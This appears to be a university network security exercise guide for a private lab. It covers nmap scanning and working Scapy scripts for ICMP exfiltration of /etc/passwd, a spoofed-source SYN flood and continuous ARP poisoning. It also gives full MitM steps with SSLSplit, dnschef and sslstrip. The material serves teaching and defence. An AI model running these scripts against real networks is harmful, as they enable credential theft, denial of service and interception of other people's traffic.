# NCS Exercise Guide — Sessions 05 & 06

> 🔴 **MANDATORY** = required for the mandatory assignment submission  
> 🟢 **Lab exercise** = class exercise, good exam prep  
> 🔵 **Bonus** = optional extension

Your IPs for the lab:
| Machine | IP |
|---|---|
| Kali (attacker) | 172.16.121.128 |
| Metasploitable2 / target | 172.16.121.136 |
| Ubuntu Server | 172.16.121.131 |

---

## Session 05 Exercises

---

### 🟢 [NMAP basic] — Basic nmap scan with Wireshark

Run a basic nmap scan against your target while Wireshark is capturing. Observe the traffic.

```bash
sudo nmap -v <target-ip>
```

**Answer:** What types of packets are sent and why?
- nmap sends ARP first (to resolve MAC), then sends TCP SYN packets to each port. Ports that respond with SYN-ACK are open; RST means closed.

---

### 🟢 [NMAP host discovery] — Discover hosts + aggressive scan

```bash
# Step 1 — ping sweep across the whole subnet:
sudo nmap -vv -n -sn -T4 172.16.121.0/24

# Step 2 — aggressive scan against a specific target:
sudo nmap -vv -Pn -sT -A 172.16.121.136
```

Capture both in Wireshark. Note the difference in packet types between the two commands.

---

### 🟢 [NMAP output] — Save results and chain commands

```bash
# Save live hosts to file:
sudo nmap -sn 172.16.121.0/24 -oG ips.txt

# Extract only IPs that are up:
grep 'Up' ips.txt | cut -d' ' -f2 > ips_up.txt

# Scan those IPs:
nmap -sS -iL ips_up.txt
```

---

### 🟢 [NMAP TCP scans] — Compare -sS and -sT

```bash
nmap -vv -sT 172.16.121.136    # Full connect — watch the complete 3-way handshake in Wireshark
nmap -vv -sS 172.16.121.136    # SYN scan — watch RST sent after SYN-ACK (no ACK)
nmap -sA 172.16.121.136        # ACK scan — detect firewall
```

**In Wireshark**, compare: does `-sT` show a full handshake? Does `-sS` reset early?

---

### 🟢 [NMAP UDP + banner grab + OS]

```bash
sudo nmap -sU 172.16.121.136              # UDP only
sudo nmap -sS -sU 172.16.121.136         # TCP + UDP combined
nmap -sV 172.16.121.136                   # Banner grabbing
sudo nmap -O -v 172.16.121.136           # OS fingerprinting
```

---

### 🟢 [NMAP NSE] — Run a scripted scan

```bash
# Find scripts:
cat /usr/share/nmap/scripts/script.db | grep http

# Get help:
nmap --script-help http-apache-server-status

# Run it:
nmap --script=http-apache-server-status 172.16.121.136
```

---

### 🔴 MANDATORY — [NMAP.01] Host Discovery Python Script

**Write a Python script that:**
- Accepts a network as a CLI argument (e.g. `192.168.234.0/24`)
- Uses the `python-nmap` module to do a host discovery scan
- Saves discovered (up) hosts to a `.txt` file named after the network

**Expected usage:**
```bash
sudo ./host_discovery.py 172.16.121.0/24
```

**Expected output file:** `hosts_172_16_121_0__24.txt` containing one IP per line.

**Install:**
```bash
sudo apt-get install python3-nmap
# or:
pip install python-nmap --break-system-packages
```

**Hint:** Use `nm.scan(hosts=network, arguments='-n -sn -PE')`, then loop `nm.all_hosts()` and check `.state() == 'up'`.

---

### 🟢 [SCAPY.01] — Ping with Scapy

Write a Python script that sends an ICMP echo request (ping) to a host using Scapy and prints the reply.

```python
from scapy.all import *

pkt = IP(src='172.16.121.128', dst='172.16.121.131') / ICMP(type=8)
ans = sr1(pkt)
ans.show()
```

Run with `sudo ./myping.py <target-ip>`. Verify you see the echo-reply fields.

---

### 🟢 [SCAPY.02] — 3-Way Handshake

Manually complete a TCP 3-way handshake using Scapy.

```python
from scapy.all import *

src = '172.16.121.128'
dst = '172.16.121.131'

# SYN
syn = IP(src=src, dst=dst) / TCP(sport=RandShort(), dport=80, flags='S', seq=100)
syn_ack = sr1(syn, verbose=0)

# ACK — seq = server's ack, ack = server's seq + 1
ack = IP(src=src, dst=dst) / TCP(
    sport=syn_ack[TCP].dport,
    dport=80,
    flags='A',
    seq=syn_ack[TCP].ack,
    ack=syn_ack[TCP].seq + 1
)
send(ack, verbose=0)
print("Handshake complete")
```

Verify in Wireshark: you should see SYN → SYN-ACK → ACK.

---

### 🟢 [SCAPY.03] — ARP Monitor

Write a script that sniffs and prints any ARP traffic on the network.

```python
from scapy.all import *

def arp_display(pkt):
    if pkt.haslayer(ARP):
        print(pkt.summary())

sniff(filter="arp", prn=arp_display, store=0)
```

Run with `sudo`. Generate ARP traffic by pinging a new host and watch the output.

---

### 🟢 [SCAPY.04] — ICMP Data Exfiltration

Write a script that reads `/etc/passwd` and sends it to a remote host **hidden inside ICMP ping payloads**.

```python
from scapy.all import *

dst = '172.16.121.131'

with open('/etc/passwd', 'rb') as f:
    data = f.read()

# Send in 48-byte chunks (normal ping payload size):
for i in range(0, len(data), 48):
    chunk = data[i:i+48]
    pkt = IP(dst=dst) / ICMP(type=8) / Raw(load=chunk)
    send(pkt, verbose=0)
```

🔵 **Bonus:** Write a receiver script on the target that sniffs ICMP and reassembles the payload.

---

### 🟢 [SYN flood] — SYN flood with srflood

```python
# In Scapy interactive (sudo scapy):
packet = IP(src="172.16.121.128", dst="172.16.121.136") / TCP(dport=80, flags="S")
srflood(packet)
```

Watch `netstat -an | grep SYN_RECV` on the target. How many half-open connections appear?

To make it work from Kali (stop kernel RST):
```bash
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.16.121.128 -j DROP
```

---

### 🔴 MANDATORY — [SCAPY.04 / MAN2.1] SYN Flood Script

**Write a Python script that sends 100 SYN packets with:**
- Spoofed source IP — rotate through **at least 10 different fake IPs**
- Spoofed source port — use **at least 10 different ports**
- Use `send()` for each packet individually

```python
from scapy.all import *
import random

dst_ip   = "172.16.121.136"
fake_ips   = ["10.0.0." + str(i) for i in range(1, 11)]
fake_ports = list(range(10000, 10010))

for _ in range(100):
    pkt = IP(src=random.choice(fake_ips), dst=dst_ip) / \
          TCP(sport=random.choice(fake_ports), dport=80, flags="S")
    send(pkt, verbose=0)

print("100 SYN packets sent")
```

Use Wireshark to verify all 100 packets appear with different source IPs/ports.

---

## Session 06 Exercises

---

### 🟢 [ARP-DNS-HTTPS.01] — ARP Poisoning with Scapy

**Write a Python script (using Scapy) that performs continuous ARP poisoning for a MitM position.**

The script needs:
- Victim IP + MAC
- Router IP + MAC
- Your (attacker) MAC
- A loop that keeps re-poisoning both sides (ARP tables expire)

```python
from scapy.all import *
import time

victim_ip  = "172.16.121.X"
victim_mac = "xx:xx:xx:xx:xx:xx"
router_ip  = "172.16.121.2"
router_mac = "xx:xx:xx:xx:xx:xx"
attacker_mac = get_if_hwaddr("eth0")   # your MAC

def poison():
    # Tell victim: router is at your MAC
    p1 = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                      psrc=router_ip,  hwsrc=attacker_mac)
    # Tell router: victim is at your MAC
    p2 = Ether(dst=router_mac) / ARP(op=2, pdst=router_ip, hwdst=router_mac,
                                      psrc=victim_ip,  hwsrc=attacker_mac)
    sendp(p1, verbose=0)
    sendp(p2, verbose=0)

while True:
    poison()
    time.sleep(1)
```

Enable IP forwarding first:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Verify in Wireshark and check `arp -a` on the victim before and after.

---

### 🔴 MANDATORY — [ARP-POISON.01 / MAN2.2] Successful MitM

**Full MitM attack — document with screenshots.**

Steps:
1. ARP poison both victim and router (use your Scapy script from above)
2. Set up iptables to redirect HTTP/HTTPS through your proxy:
   ```bash
   sudo iptables -t nat -A PREROUTING -p tcp --dport 80  ! -d <kali-ip> -j REDIRECT --to-ports 8080
   sudo iptables -t nat -A PREROUTING -p tcp --dport 443 ! -d <kali-ip> -j REDIRECT --to-ports 8443
   ```
3. Generate a self-signed CA cert:
   ```bash
   sudo openssl genrsa -out ca.key 4096
   sudo openssl req -new -x509 -days 45 -key ca.key -out ca.crt
   sudo mkdir /tmp/sslsplit sniff_data
   ```
4. Start SSLSplit:
   ```bash
   sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data \
     -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
   ```
5. From the victim — browse a website over HTTP
6. Check `sniff_data/` for captured plaintext

**Document:** ARP table before/after, Wireshark capture, sniff_data output.

🔵 **Bonus:** Install `ca.crt` as a trusted CA on the victim — victim gets no certificate warning.

---

### 🟢 [ARP-DNS-HTTPS.02] — DNS Spoofing + SSLStrip

```bash
# 1. ARP poisoning running (from above)

# 2. Redirect DNS:
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5353

# 3. Start dnschef (all queries → your IP):
dnschef --fakeip=172.16.121.128 --interface=0.0.0.0 -p 5353

# 4. Start Apache:
sudo service apache2 start

# 5. From victim — nslookup google.com → should return your Kali IP
```

Also attempt SSLStrip:
```bash
sudo sslstrip -a -l 8080
# Browse to kea.dk from victim — check sslstrip.log
```

**Write a 1-page reflection:** What tools/settings/technologies can prevent ARP poisoning and DNS spoofing in an organisation? (Can be done in groups)

---

### 🟢 [ARP-DNS-HTTPS.03] — Analyse DNS Spoof Captures

Look at the two pcap files: `dnsspoof dr.dk 1.pcapng` and `dnsspoof dr.dk 2.pcapng`.

- Filter: `dns && dns.qry.name == "www.dr.dk"`
- Identify the DNS query and the responses in each file
- In file 1: which response arrived first?
- In file 2: which response arrived first?
- Explain why the outcome is different between the two captures

This illustrates the **race condition** problem with DNS spoofing — the legitimate response and the spoofed response compete.

---

## Clean Up After Exercises

Always restore your environment after attack exercises:

```bash
# Flush iptables:
sudo iptables -t nat -F
sudo iptables -F

# Disable IP forwarding:
sudo sysctl -w net.ipv4.ip_forward=0

# Verify ARP tables normalise (victim):
arp -a
```

---

## Summary — Which Exercises Are Mandatory

| Exercise | Session | Status |
|---|---|---|
| [NMAP.01] Host Discovery Python Script | 05 | 🔴 MANDATORY |
| [MAN2.1 / SCAPY.04] SYN Flood Script (100 packets, spoofed IPs + ports) | 05 | 🔴 MANDATORY |
| [MAN2.2 / ARP-POISON.01] Successful MitM with SSLSplit + screenshots | 06 | 🔴 MANDATORY |
| [SCAPY.01] Ping with Scapy | 05 | 🟢 Lab |
| [SCAPY.02] 3-Way Handshake | 05 | 🟢 Lab |
| [SCAPY.03] ARP Monitor | 05 | 🟢 Lab |
| [SCAPY.04] ICMP Exfiltration | 05 | 🟢 Lab |
| [ARP-DNS-HTTPS.01] ARP Poison Scapy Script | 06 | 🟢 Lab (feeds into mandatory) |
| [ARP-DNS-HTTPS.02] DNS Spoofing + SSLStrip + 1-page reflection | 06 | 🟢 Lab |
| [ARP-DNS-HTTPS.03] Analyse pcap files | 06 | 🟢 Lab |

> Note: MAN2.1 and MAN2.2 are part of **Mandatory 2** — the hands-on exercises deliverable due 28-05-26.